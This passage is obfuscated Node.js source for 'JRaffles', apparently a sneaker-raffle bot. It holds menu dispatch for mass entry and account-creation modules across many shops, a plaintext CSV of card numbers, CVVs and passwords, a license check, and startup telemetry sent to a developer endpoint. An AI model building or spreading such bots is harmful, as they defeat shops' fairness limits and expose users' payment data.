                        var _0x3f5ed5 = _0x285a69[_0x5b46c8]['Store'], _0x35c9ae = _0x285a69[_0x5b46c8]['Mode'];
                        for (var _0x54c028 of _0x2cac2b) {
                            const _0x4e8b08 = _0x54c028['name']['includes'](_0x3f5ed5);
                            if (!_0x4e8b08)
                                continue;
                            for (mode of _0x54c028['modules']) {
                                if (mode['name'] == _0x35c9ae) {
                                    console['log']('Running\x20' + _0x1de0e8['cyan'](mode['name'])), await mode['function'](mode, [_0x285a69[_0x5b46c8]], _0x37544d);
                                    var _0x1c9cbf = _0xc8afd7['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x4a3989['writeFileSync']('../failed-tasks.csv', _0x1c9cbf);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x64b444 = await _0x4a7744['get']('Answer');
                    if (_0x64b444['Answer']['toLowerCase']() == 'y') {
                        _0x4a3989['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x4d97b0(0x3e8);
                        return;
                    }
                    if (_0x64b444['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x4d97b0(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x4d97b0(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x5c16ee(_0x649c67) {
    var _0x3ec022 = await _0x210300(), _0x236c85 = _0x4a3989['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x447d12 = _0x4dbee3['parse'](_0x236c85, { 'header': !![] })['data'];
    for (var _0x716d5f = 0x0; _0x716d5f < _0x447d12['length']; _0x716d5f++) {
        var _0x392484 = _0x447d12[_0x716d5f]['Store'], _0x287674 = _0x447d12[_0x716d5f]['Mode'];
        for (var _0x4c6537 of _0x2cac2b) {
            const _0x4be48f = _0x4c6537['name']['includes'](_0x392484);
            if (_0x4be48f)
                for (mode of _0x2cac2b[_0x4c6537]['modules']) {
                    const _0xd761f6 = mode['name']['includes'](_0x287674);
                    _0xd761f6 && (_0x649c67 = mode['name'], await mode['function'](_0x649c67, _0x447d12[_0x716d5f], _0x3ec022));
                }
        }
    }
}
async function _0x187863() {
    await _0xcd86d4(), console['clear']();
    _0x4562fb['threads'] > 0x5 && (_0x4562fb['threads'] = 0x5);
    if (_0x5acae2 != 'devkey') {
        let _0x1f3588 = await _0x550d78['autoUpdate']();
        if (_0x1f3588 === 'yes')
            return _0x2fb36e('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xcdd971 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4d97b0(0x2710);
        ;
    }
    await _0x1ccfab(_0xcdd971);
    if (_0x4097b2 === ![])
        return console['log']('Closing\x20Browser'), await _0x4d97b0(0xbb8);
    else
        try {
            var _0x2e5edc = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1d8120
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5acae2
                    }
                ]
            }];
            const _0x58d993 = { 'embeds': _0x2e5edc };
            var _0x391662 = await _0x4ef820(null, null, 'open', ![]);
            const _0x3bc43b = { 'openDEVMSG': { 'embeds': [_0x391662] } };
            await _0xa7b872(_0x4d6ced, _0x3bc43b['openDEVMSG']);
            async function _0x53bae9() {
                _0x81eb1('JRaffles\x20' + _0x5acae2), console['clear'](), console['log']('Hello\x20' + _0x1de0e8['cyan']('' + _0x1d8120) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5acae2), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x23e0b9 = 0x0; _0x23e0b9 < _0x2cac2b['length'] - 0x4; _0x23e0b9++) {
                    if (_0x23e0b9 >= 0xa) {
                        console['log']('\x20(' + _0x23e0b9 + ')\x20[' + _0x2cac2b[_0x23e0b9]['name'] + ']');
                        continue;
                    }
                    if (_0x2cac2b[_0x23e0b9]['name'] === 'Reload\x20Settings' || _0x2cac2b[_0x23e0b9]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x23e0b9 + ')\x20\x20[' + _0x2cac2b[_0x23e0b9]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2cac2b['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2cac2b['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2cac2b['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2cac2b['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2544e1();
                if (taskModule > _0x2cac2b['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x4d97b0(0x3e8), _0x53bae9();
                if (_0x2cac2b[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x41ebc5 = await _0x210300();
                            await _0x8be259['function'](_0x8be259, _0x41ebc5);
                        }
                        if (taskFunction == 0x2) {
                            var _0x41ebc5 = await _0x210300(), _0x5e5ffc = await _0x4528f2(_0x8be259);
                            _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x5e5ffc), await _0x8be259['function'](_0x8be259, _0x5e5ffc, _0x41ebc5);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41ebc5 = await _0x210300(), _0x5e5ffc = await _0x4528f2(_0x8be259);
                                _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x5e5ffc), await _0x8be259['function'](_0x8be259, _0x5e5ffc, _0x41ebc5);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x41ebc5 = await _0x210300();
                                    await _0x8be259['function'](_0x8be259, _0x41ebc5);
                                }
                            }
                        }
                    } catch (_0x52a464) {
                        console['log'](_0x52a464), await _0x4d97b0(0x7d0);
                    }
                    return _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                        var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x41ebc5 = await _0x210300(), _0xa0f7c = await _0x4528f2(_0x8be259);
                            _0x4562fb['shuffleTasks'] && await _0x7953e8(_0xa0f7c), await _0x8be259['function'](_0x8be259, _0xa0f7c, _0x41ebc5);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41ebc5 = await _0x210300(), _0xa0f7c = await _0x4528f2(_0x8be259);
                                _0x4562fb['shuffleTasks'] && await _0x7953e8(_0xa0f7c), await _0x8be259['function'](_0x8be259, _0xa0f7c, _0x41ebc5);
                            }
                        }
                    } catch (_0x595e41) {
                        console['log'](_0x595e41), await _0x4d97b0(0xfa0);
                    }
                    return _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                        var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x41ebc5 = await _0x210300(), _0xa0f7c = await _0x4528f2(_0x8be259);
                            _0x4562fb['shuffleTasks'] && await _0x7953e8(_0xa0f7c), await _0x8be259['function'](_0x8be259, _0xa0f7c, _0x41ebc5);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x41ebc5 = await _0x210300(), _0xa0f7c = await _0x4528f2(_0x8be259);
                                _0x4562fb['shuffleTasks'] && await _0x7953e8(_0xa0f7c), await _0x8be259['function'](_0x8be259, _0xa0f7c, _0x41ebc5);
                            }
                        }
                    } catch (_0x4b4d23) {
                        console['log'](_0x4b4d23), await _0x4d97b0(0xfa0);
                    }
                    return _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x41ebc5 = await _0x210300();
                        return await _0x8be259['function'](_0x8be259, _0x41ebc5), _0x53bae9();
                    }
                    var _0x41ebc5 = await _0x210300(), _0x2a1d27 = await _0x4528f2(_0x8be259);
                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x2a1d27), await _0x8be259['function'](_0x8be259, _0x2a1d27, _0x41ebc5), _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41ebc5 = await _0x210300(), _0x2a1d27 = await _0x4528f2(_0x8be259);
                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x2a1d27), await _0x8be259['function'](_0x8be259, _0x2a1d27, _0x41ebc5), _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41ebc5 = await _0x210300(), _0x2a1d27 = await _0x4528f2(_0x8be259);
                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x2a1d27), await _0x8be259['function'](_0x8be259, _0x2a1d27, _0x41ebc5), _0x53bae9();
                }
                if (_0x2cac2b[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x41ebc5 = await _0x210300(), _0x2a1d27 = await _0x4528f2(_0x8be259);
                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x2a1d27), await _0x8be259['function'](_0x8be259, _0x2a1d27, _0x41ebc5), _0x53bae9();
                } else {
                    if (_0x2cac2b[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                        var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x41ebc5 = await _0x210300(), _0x26784b = await _0x4528f2(_0x8be259);
                            return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x26784b), await _0x8be259['function'](_0x8be259, _0x26784b, _0x41ebc5), _0x53bae9();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x41ebc5 = await _0x210300();
                                return await _0x8be259['function'](_0x8be259, null, _0x41ebc5), _0x53bae9();
                            }
                        }
                        ;
                    } else {
                        if (_0x2cac2b[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                            var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction], _0x41ebc5 = await _0x210300(), _0x3174bc = await _0x4528f2(_0x8be259);
                            return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x3174bc), await _0x8be259['function'](_0x8be259, _0x3174bc, _0x41ebc5), await _0x4d97b0(0x1388), _0x53bae9();
                        } else {
                            if (_0x2cac2b[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x40ca8c = { 'headers': { 'content-type': 'application/json' } }, _0x5c40c3 = { 'key': _0xcdd971 }, _0x3d93b6 = await _0x4012a9['post']('https://jraffles.herokuapp.com/beta', _0x5c40c3, _0x40ca8c);
                                    if (_0x3d93b6['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0x1de0e8['cyan'](_0x1d8120) + '.\x20Beta\x20Access\x20Granted.'), await _0x4d97b0(0x3e8);
                                } catch (_0x463260) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x4d97b0(0x7d0), _0x53bae9();
                                }
                                taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction], _0x41ebc5 = await _0x210300(), _0x3174bc = await _0x4528f2(_0x8be259);
                                return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x3174bc), await _0x8be259['function'](_0x8be259, _0x3174bc, _0x41ebc5), await _0x4d97b0(0x1388), _0x53bae9();
                            } else {
                                if (_0x2cac2b[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x41ebc5 = await _0x210300(), _0x26784b = await _0x4528f2(_0x8be259);
                                        return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x26784b), await _0x8be259['function'](_0x8be259, _0x26784b, _0x41ebc5), _0x53bae9();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x41ebc5 = await _0x210300();
                                            return await _0x8be259['function'](_0x8be259, null, _0x41ebc5), _0x53bae9();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2cac2b[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                        var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x8be259);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2cac2b[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                            var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x41ebc5 = await _0x210300(), _0x16251d = await _0x4528f2(_0x8be259);
                                                return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x16251d), await _0x8be259['function'](_0x8be259, _0x16251d, _0x41ebc5), _0x53bae9();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x41ebc5 = await _0x210300(), _0x16251d = await _0x4528f2(_0x8be259);
                                                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x16251d), await _0x8be259['function'](_0x8be259, _0x16251d, _0x41ebc5), _0x53bae9();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2cac2b[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                                var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x41ebc5 = await _0x210300(), _0x518412 = await _0x4528f2(_0x8be259);
                                                    return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x518412), await _0x8be259['function'](_0x8be259, _0x518412, _0x41ebc5), _0x53bae9();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x41ebc5 = await _0x210300(), _0x518412 = await _0x4528f2(_0x8be259);
                                                        return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x518412), await _0x8be259['function'](_0x8be259, _0x518412, _0x41ebc5), _0x53bae9();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2cac2b[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x41ebc5 = await _0x210300(), _0x5c2723 = await _0x4528f2(_0x8be259);
                                                        return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x5c2723), await _0x8be259['function'](_0x8be259, _0x5c2723, _0x41ebc5), _0x53bae9();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x41ebc5 = await _0x210300(), _0x5c2723 = await _0x4528f2(_0x8be259);
                                                            return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x5c2723), await _0x8be259['function'](_0x8be259, _0x5c2723, _0x41ebc5), _0x53bae9();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x2cac2b[taskModule]['name'] == 'JD') {
                                                        taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                                        var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x41ebc5 = await _0x210300(), _0x45c291 = await _0x4528f2(_0x8be259);
                                                            return _0x4562fb['shuffleTasks'] && await _0x7953e8(_0x45c291), await _0x8be259['function'](_0x8be259, _0x45c291, _0x41ebc5), _0x53bae9();
                                                        }
                                                    } else {
                                                        if (_0x2cac2b[taskModule]['name'] == 'Seven\x20Store')
                                                            return console['log']('returning\x20to\x20menu'), await _0x4d97b0(0x3e8), _0x53bae9();
                                                        else {
                                                            if (_0x2cac2b[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                var _0x47a4a4 = _0x2cac2b[taskModule]['name'], _0x41ebc5 = await _0x210300();
                                                                return await _0x5d5794(_0x47a4a4, _0x41ebc5), _0x53bae9();
                                                            } else {
                                                                if (_0x2cac2b[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                    taskFunction = await _0x24553f(_0x2cac2b[taskModule]['modules']);
                                                                    var _0x8be259 = _0x2cac2b[taskModule]['modules'][taskFunction];
                                                                    return await _0x8be259['function'](_0x8be259), _0x53bae9();
                                                                } else {
                                                                    if (_0x2cac2b[taskModule]['name'] == 'Change\x20Settings') {
                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                        var _0x32ae24 = 0x0;
                                                                        for (const _0x2de1a0 in _0x4562fb) {
                                                                            console['log']('(' + _0x32ae24 + ')\x20' + _0x2de1a0 + '\x20:\x20' + _0x4562fb[_0x2de1a0]), _0x32ae24++;
                                                                        }
                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x32ae24 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                        var _0x4bc73e = await _0x12a822();
                                                                        if (_0x4bc73e == _0x32ae24)
                                                                            return _0x53bae9();
                                                                        console['clear'];
                                                                        var _0x5ea83a = 0x0;
                                                                        for (var _0x709ae5 in _0x4562fb) {
                                                                            if (_0x4bc73e == _0x5ea83a) {
                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x709ae5 + '\x20:'), _0x4562fb[_0x709ae5] = await _0x11969e(), _0x4a3989['writeFileSync']('../settings.json', JSON['stringify'](_0x4562fb));
                                                                                break;
                                                                            } else
                                                                                _0x5ea83a++;
                                                                        }
                                                                        return console['log']('Settings\x20Saved!'), await _0x4d97b0(0xbb8), _0x53bae9();
                                                                    } else {
                                                                        if (_0x2cac2b[taskModule]['name'] == 'Reload\x20Settings')
                                                                            return console['log']('Reloading\x20settings'), await _0xcd86d4(), _0x53bae9();
                                                                        else {
                                                                            if (taskModule == 0x45) {
                                                                                _0x2cac2b[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                var _0x88cb0a = await _0x5017ff();
                                                                                _0x88cb0a == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x3f38c9(), await afewFunction(_0x1872fe[_0x2ff233], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4d97b0(0xbb8));
                                                                            } else {
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x53bae9();
            } catch (_0x49b269) {
                return console['log'](_0x49b269), await _0x4d97b0(0x2710), _0x53bae9();
            }
        } catch (_0x44b8af) {
            return console['log'](_0x44b8af), await _0x4d97b0(0x3a98);
        }
}
;
_0x81eb1('JRaffles\x20' + _0x5acae2);
try {
    _0xcd86d4(), _0x187863();
} catch (_0x2d4226) {
    console['log'](_0x2d4226);
}